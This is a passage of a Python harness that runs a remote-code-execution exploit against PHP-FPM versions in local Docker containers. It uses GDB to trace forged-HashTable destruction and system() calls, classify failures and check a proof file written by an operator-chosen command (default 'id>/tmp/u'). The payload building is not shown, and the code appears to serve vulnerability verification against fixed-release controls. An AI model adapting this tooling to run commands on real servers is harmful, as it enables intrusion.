                proof_result = docker("exec", FPM, "cat", PROOF_PATH, timeout=10)
                if proof_result.returncode == 0 and PROOF_TOKEN in proof_result.stdout:
                    proof = proof_result.stdout[:120].strip()
                    break
                time.sleep(0.5)
            row["proof"] = proof
            row["proof_path"] = PROOF_PATH
            row["hit"] = bool(proof)
            row["gdb_closure"] = {
                "zend_array_destroy_seen": "in zend_array_destroy" in log_text,
                "fake_array_ht": (hex(attack_ardata + 0x80)
                                  if attack_ardata is not None else None),
                "fake_array_destroy_seen": fake_array_destroy_seen(
                    log_text, attack_ardata),
                "system_call_seen": "SYSTEM_CALL arg0=" in log_text,
                "system_return_values": [
                    "value=%s signed=%s" % match for match in re.findall(
                        r"SYSTEM_RETURN pc=0x[0-9a-fA-F]+ value=(0x[0-9a-fA-F]+) signed=(-?\d+)",
                        log_text)],
                "fake_gc_watch_armed": "WATCHES armed" in log_text,
                "out_gc_refcount_values": [
                    hex(int(value, 16)) for value in re.findall(
                        r"WATCHPOINT_HIT out\.gc\.refcount val=0x([0-9a-fA-F]+)",
                        log_text)],
                "vfork_seen": ("Detaching after vfork" in log_text or
                               "vfork to child process" in log_text or
                               "Detaching vfork parent" in log_text),
                "process_creation_function_seen": any(
                    "FUNCTION_HIT symbol=" + name in log_text
                    for name in ("vfork", "__vfork", "__libc_vfork", "fork",
                                 "__fork", "__libc_fork", "posix_spawn",
                                 "__posix_spawn", "clone", "__clone")),
                "execve_function_seen": ("FUNCTION_HIT symbol=execve" in log_text or
                                          "FUNCTION_HIT symbol=__execve" in log_text),
                "stack_check_failure_seen": ("FUNCTION_HIT symbol=__stack_chk_fail" in log_text or
                                             "FUNCTION_HIT symbol=__stack_chk_fail_local" in log_text),
                "delayed_oom_handler_seen": "zend_handle_delayed_oom" in log_text,
                "attack_outer_ht": (hex(attack_ht(log_text)[0])
                                    if attack_ht(log_text)[0] is not None else None),
                "attack_bucket1_at_destroy": destroyed_bucket1(
                    log_text, attack_ht(log_text)[0], attack_ht(log_text)[1]),
                "signal_trace": ("SIGNAL_TRACE SIGABRT" if "SIGNAL_TRACE SIGABRT" in log_text else
                                 "SIGNAL_TRACE SIGSEGV" if "SIGNAL_TRACE SIGSEGV" in log_text else None),
                "signal_backtrace": signal_excerpt or None,
                "log_tail": log_text[-2000:],
            }
            if row["hit"]:
                row["failure_analysis"] = None
            elif attack_ardata is None:
                row["failure_analysis"] = (
                    "The gdb log has no attack HUGEKEYIND record; the request did not reach the measured OOM key insertion. "
                    "Use the HTTP response and gdb tail to identify the earlier failure.")
            elif attack_ardata != dry_ardata:
                row["failure_analysis"] = (
                    "The dry calibration address did not predict the attack request's arData; the observed delta is recorded above. "
                    "The forged pointers therefore targeted the wrong array slot.")
            else:
                system_hit = "SYSTEM_CALL arg0=" in log_text
                process_create = any(
                    "FUNCTION_HIT symbol=" + name in log_text
                    for name in ("vfork", "__vfork", "__libc_vfork", "fork",
                                 "__fork", "__libc_fork", "posix_spawn",
                                 "__posix_spawn", "clone", "__clone"))
                execve_hit = ("FUNCTION_HIT symbol=execve" in log_text or
                              "FUNCTION_HIT symbol=__execve" in log_text)
                if system_hit and not process_create and not execve_hit and "Detaching after vfork" not in log_text:
                    returned = row["gdb_closure"].get("system_return_values", [])
                    if "stack smashing detected" in row["fpm_log"].get("tail", ""):
                        row["failure_analysis"] = (
                            "The calibrated fake array is destroyed and system() receives the exact command bytes, "
                            "but no libc process-creation/execve boundary is reached. FPM then reports stack smashing "
                            "and SIGABRT; the GDB backtrace shows a corrupt return chain from Zend destruction. The "
                            "verified failure point is stack corruption in the callback/destroy path before child "
                            "launch. system() return marker=%s. No %s proof was created." %
                            (returned, PROOF_PATH))
                    elif "name=0xfffffc10" in log_text:
                        row["failure_analysis"] = (
                            "The calibrated fake array is destroyed and system() receives the exact command bytes, "
                            "but no libc process-creation/execve boundary is reached. The worker then SIGSEGVs in "
                            "__realpath with name=0xfffffc10 from zend_array_destroy; GDB reports a corrupt return "
                            "chain. The verified failure point is invalid cleanup state in the PHP 7.4 hash-destroy "
                            "path before child launch. system() return marker=%s. No %s proof was created." %
                            (returned, PROOF_PATH))
                    else:
                        row["failure_analysis"] = (
                            "The measured arData matches and the forged destructor reaches system() with the command bytes, "
                            "but the instrumented libc process-creation functions and execve functions were not entered "
                            "before the traced process faulted, and GDB reported no fork/vfork child. This localizes "
                            "the failure before command process creation; see the entry registers, backtrace, "
                            "and signal trace. system() return marker=%s. No command proof was created." %
                            returned)
                elif system_hit and process_create and not execve_hit and "Detaching after vfork" not in log_text:
                    row["failure_analysis"] = (
                        "The measured arData matches, system() receives the command, and a libc process-creation "
                        "function is observed, but no execve function or vfork child event is observed before the fault. "
                        "Process creation began, while shell execution did not reach execve under this trace; see "
                        "the function backtraces and FPM signal. "
                        "No command proof was created.")
                elif system_hit and execve_hit:
                    row["failure_analysis"] = (
                        "The measured arData matches, system() receives the command, and execve is observed, but "
                        "the HTTP proof file lacks configured token %r. The retained syscall and signal traces delimit the "
                        "failure to command execution or post-exec completion; this run does not establish RCE proof." %
                        PROOF_TOKEN)
                elif (not system_hit and row["shutdown_trigger"].get("file_present")
                      and row["gdb_closure"].get("fake_array_destroy_seen")):
                    row["failure_analysis"] = (
                        "GDB observed destruction of the calibrated fake HashTable but no system() entry. "
                        "The target reached the fake array and stopped before its pDestructor call; inspect the "
                        "bucket bytes and fatal-signal trace in the paired GDB log.")
                elif not system_hit and row["shutdown_trigger"].get("file_present"):
                    trigger_text = row["shutdown_trigger"].get("contents") or ""
                    target_bucket = row["gdb_closure"].get(
                        "attack_bucket1_at_destroy") or {}
                    if (row.get("expected_patch_control")
                            and row["gdb_closure"].get("zend_array_destroy_seen")
                            and target_bucket.get("ptr")
                            and row["gdb_closure"].get("fake_array_ht")
                            and target_bucket.get("ptr", "").lower() !=
                            row["gdb_closure"]["fake_array_ht"].lower()
                            and target_bucket.get("type_info") not in (None, "0x107")):
                        row["failure_analysis"] = (
                            "The fixed-release control reached OOM cleanup and outer array destruction, "
                            "but the stale trigger bucket was rewritten: bucket1 type_info=%s and ptr=%s, "
                            "rather than the vulnerable fake-array zval type_info 0x107. GDB saw no fake-array "
                            "destructor, system(), or child process, and the id proof is absent. This is observed "
                            "patch behavior for %s." %
                            (target_bucket.get("type_info"), target_bucket.get("ptr"),
                             row.get("tag", "this fixed-release control")))
                    elif "SDFN out MISSING" in trigger_text:
                        row["failure_analysis"] = (
                            "The dry calibration matched, but the script shutdown callback ran without a global $out. "
                            "The target version's OOM/bailout state therefore did not expose the parse_str result in "
                            "the expected global slot; no forged destructor was reached.")
                    elif "SDFN assign done" in trigger_text:
                        rc_values = row["gdb_closure"].get("out_gc_refcount_values", [])
                        rc_low = [int(value, 16) & 0xffffffff for value in rc_values]
                        if len(rc_low) >= 2 and max(rc_low) > min(rc_low) and rc_low[-1] == 1:
                            row["failure_analysis"] = (
                                "The dry calibration matched and the shutdown callback completed its write-through "
                                "assignment, but the calibrated fake HashTable was never destroyed. GDB watched the "
                                "parse_str result's GC word rise from refcount 1 to 2 and return to 1; it never reached "
                                "zero, so no fake-array destructor/system() call followed. This confirms a live-owner "
                                "reference-count mismatch in this target version; the paired log contains the stacks "
                                "for those refcount writes.")
                        else:
                            row["failure_analysis"] = (
                                "The dry calibration matched and the shutdown callback wrote through $GLOBALS['out'], "
                                "but GDB saw no fake-array destroy/system() entry. The callback ran; the target version's "
                                "reference ownership or array-destruction semantics prevented the intended stale-bucket "
                                "walk. The shutdown log and GDB trace delimit the failure.")
                    else:
                        row["failure_analysis"] = (
                            "The dry calibration matched, but no system() entry was logged. The shutdown callback "
                            "trace records where it stopped before the intended fake-array destructor; see the GDB "
                            "and FPM logs for the remaining boundary.")
                else:
                    row["failure_analysis"] = (
                        ("Dry calibration and attack arData match, but %s lacks configured proof token %r and no system() entry "
                         "was logged. The retained destructor and FPM signal evidence identifies the earlier stop point.")
                        % (PROOF_PATH, PROOF_TOKEN))
        else:
            logs = docker("logs", FPM)
            all_logs = logs.stdout + logs.stderr
            segv_after = all_logs.count("signal 11 (SIGSEGV)")
            sigbus_after = all_logs.count("signal 7 (SIGBUS)")
            row["oracle"].update({
                "segv_after": segv_after,
                "segv_new": segv_after - row["oracle"]["segv_before"],
                "confirmed": segv_after > row["oracle"]["segv_before"],
                "sigbus_after": sigbus_after,
                "fpm_log_tail": all_logs[-1200:],
            })
            row["gdb_closure"] = {
                "zend_array_destroy_seen": "in zend_array_destroy" in log_text,
                "fake_gc_watch_armed": "WATCHES armed" in log_text,
                "segv_pass_configured": "handle SIGSEGV stop print pass" in " ".join(gdb_args),
                "fatal_signal_trace": next((line for line in log_text.splitlines()
                                             if line.startswith("SIGNAL_TRACE ")), None),
                "log_tail": log_text[-2000:],
            }
            if row["oracle"]["confirmed"]:
                row["failure_analysis"] = None
            elif attack_ardata != dry_ardata:
                row["failure_analysis"] = (
                    "The dry calibration address did not predict the oracle request arData, so the bad destructor pointer was not applied to the intended stale bucket.")
            else:
                row["failure_analysis"] = (
                    "No new FPM SIGSEGV followed a matching-address oracle request. Check the gdb trace for a destructor-path miss; the request and log tails are retained above.")
    except (Exception, SystemExit) as exc:  # noqa: BLE001
        row["status"] = "failed"
        row["error"] = "%s: %s" % (type(exc).__name__, exc)
        if not row.get("failure_analysis"):
            if "no FPM worker before debugger bootstrap" in row["error"]:
                row["failure_analysis"] = (
                    "The container startup completed, but the runner's pre-bootstrap worker lookup returned no PID. "
                    "This happened before GDB attach, HTTP probe, or exploit traffic; the run is a harness setup failure, not a vulnerability result. "
                    "The paired GDB log records GDB_NOT_STARTED and the owned containers were cleaned up.")
            elif (row.get("platform") == "linux/amd64"
                    and "gdb exited during attach" in row["error"]
                    and "ptrace: Function not implemented" in
                    open(row["evidence"]["gdb_log"], errors="replace").read()):
                row["failure_analysis"] = (
                    "The linux/amd64 PHP-FPM target started, but GDB could not attach: "
                    "the Docker host is %s (ARM64) and its amd64 emulation reports "
                    "'ptrace: Function not implemented'. The run stopped before address "
                    "calibration or attack traffic, so it is an environment limitation, "
                    "not a negative vulnerability result. Re-run on native x86_64 Linux." %
                    row.get("host_arch", "unknown-arch"))
            else:
                row["failure_analysis"] = (
                    "The run stopped at the recorded setup or probe stage. No success is claimed; inspect the structured error and retained gdb log.")
    finally:
        try:
            stop_gdb(FPM if container_started else None, gdb_proc,
                     row["processes"].get("gdb", {}))
        except Exception as exc:  # noqa: BLE001
            row.setdefault("cleanup", {})["gdb_cleanup_error"] = (
                "%s: %s" % (type(exc).__name__, exc))
        if log_fh:
            log_fh.close()
        if container_started and "fpm_log" not in row:
            try:
                fpm_logs = docker("logs", FPM, timeout=10)
                row["fpm_log_at_cleanup"] = {
                    "exit_code": fpm_logs.returncode,
                    "tail": (fpm_logs.stdout + fpm_logs.stderr)[-1600:],
                }
            except Exception as exc:  # noqa: BLE001
                row["fpm_log_capture_error"] = "%s: %s" % (
                    type(exc).__name__, exc)
        log_path = row["evidence"]["gdb_log"]
        if not os.path.exists(log_path):
            with open(log_path, "w") as log_out:
                log_out.write("GDB_NOT_STARTED\n")
                log_out.write("experiment=%s branch=%s tag=%s\n" %
                              (run_id, branch, tag))
                log_out.write("root_cause=%s\n" % row.get("error", "unknown"))
        try:
            row.setdefault("cleanup", {}).update(clean_lab())
        except Exception as exc:  # noqa: BLE001
            row.setdefault("cleanup", {})["cleanup_error"] = (
                "%s: %s" % (type(exc).__name__, exc))
        row["finished_at_utc"] = now_utc()
        try:
            final_log_text = open(log_path, errors="replace").read()
            row["classification"] = result_classification(row, final_log_text)
            row["failure_root_evidence"] = (failure_evidence(row, final_log_text)
                                            if not row.get("hit") else None)
        except Exception as exc:  # noqa: BLE001
            row["classification"] = "inconclusive"
            row["failure_root_evidence"] = [
                "could not derive final evidence summary: %s: %s" %
                (type(exc).__name__, exc)]
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, "w") as fh:
            json.dump(row, fh, indent=2)
    return row


def main():
    global CMD, PROOF_PATH, PROOF_TOKEN
    ap = argparse.ArgumentParser()
    ap.add_argument("--branches", default="8.1,8.0,7.4",
                    help="comma-separated vulnerable keys or fixed controls: "
                         "7.4,8.0,8.1,8.2,8.3,8.4,8.5,"
                         "8.2.35,8.3.36,8.4.27,8.5.12,x86_64,"
                         "x86_64-8.1,x86_64-8.0,x86_64-7.4,x86_64-8.5,"
                         "x86_64-8.4.27,alpine-8.4,alpine-8.1")
    ap.add_argument("--kind", choices=("rce", "oracle"), default="rce")
    ap.add_argument("--rounds", type=int, default=1)
    ap.add_argument("--p0", type=lambda x: int(x, 0), default=P0_DEFAULT)
    ap.add_argument("--trigger-mode", choices=("auto", "1", "2", "3"),
                    default="auto",
                    help="auto selects mode 2 for PHP 8.5 and mode 1 otherwise")
    ap.add_argument("--fake-gc-refcount", choices=("auto", "0", "1", "2"),
                    default="auto",
                    help="auto selects GC refcount 0 for PHP 8.5 pop mode, 1 otherwise")
    ap.add_argument("--cmd", default=CMD,
                    help="operator-selected proof command (max 23 UTF-8 bytes; default: id>/tmp/u)")
    ap.add_argument("--proof-path", default=PROOF_PATH,
                    help="absolute path the command writes (default: /tmp/u)")
    ap.add_argument("--proof-token", default=PROOF_TOKEN,
                    help="text that must appear in the command output (default: uid=)")
    ap.add_argument("--port-base", type=int, default=28400)
    ap.add_argument("--out-dir", default=os.path.join(
        ROOT, "out", "version-matrix"))
    args = ap.parse_args()
    CMD = args.cmd
    PROOF_PATH = args.proof_path
    PROOF_TOKEN = args.proof_token
    if not CMD or "\x00" in CMD or len(CMD.encode()) > 23:
        ap.error("--cmd must be non-empty, contain no NUL, and be at most 23 UTF-8 bytes")
    if not PROOF_PATH.startswith("/") or "\x00" in PROOF_PATH:
        ap.error("--proof-path must be an absolute path without NUL")
    if not PROOF_TOKEN:
        ap.error("--proof-token must be non-empty")
    if args.rounds < 1 or args.rounds > 5:
        ap.error("--rounds must be between 1 and 5")
    selected = [x.strip() for x in args.branches.split(",") if x.strip()]
    unknown = [x for x in selected if x not in BRANCHES]
    if unknown:
        ap.error("unknown branch key(s): " + ",".join(unknown))
    os.makedirs(args.out_dir, exist_ok=True)
    run_stamp = dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    results = []
    for b_index, branch in enumerate(selected):
        tag, platform = BRANCHES[branch]
        is_85 = tag.startswith("php:8.5")
        trigger_mode = (int(args.trigger_mode) if args.trigger_mode != "auto"
                        else (2 if is_85 else 1))
        fake_gc_refcount = (
            int(args.fake_gc_refcount) if args.fake_gc_refcount != "auto"
            else (0 if is_85 and trigger_mode in (2, 3) else 1))
        trigger_profile = (
            "php-8.5-pop-gc0" if is_85 and trigger_mode in (2, 3)
            and fake_gc_refcount == 0 else "write-through-gc1")
        legacy_x86_single_slot = branch in {"x86_64-8.0", "x86_64-7.4"}
        trigger_slots = 1 if legacy_x86_single_slot else 4
        trigger_bucket = 1 if legacy_x86_single_slot else 0
        for round_no in range(1, args.rounds + 1):
            out = os.path.join(args.out_dir,
                               "adapt-%s-%s-%s-r%d.json" %
                               (branch.replace(".", ""), args.kind,
                                run_stamp, round_no))
            port = args.port_base + b_index * 10 + round_no
            print("== %s %s %s round %d port %d" %
                  (branch, tag, platform, round_no, port), flush=True)
            row = run_sample(branch, tag, platform, args.kind, out, port,
                             args.p0, trigger_mode,
                             fake_gc_refcount, trigger_profile,
                             trigger_slots, trigger_bucket)
            results.append(row)
            print("   status=%s hit=%s oracle=%s delta=%s proof=%s" %
                  (row.get("status", "completed"), row.get("hit"),
                   row.get("oracle", {}).get("confirmed"),
                   row.get("attack", {}).get("probe_to_attack_delta"),
                   row.get("proof", "")), flush=True)
    summary = os.path.join(args.out_dir,
                           "adapt-matrix-%s-%s.json" % (args.kind, run_stamp))
    with open(summary, "w") as fh:
        json.dump(results, fh, indent=2)
    print("saved: %s" % summary, flush=True)


if __name__ == "__main__":
    main()
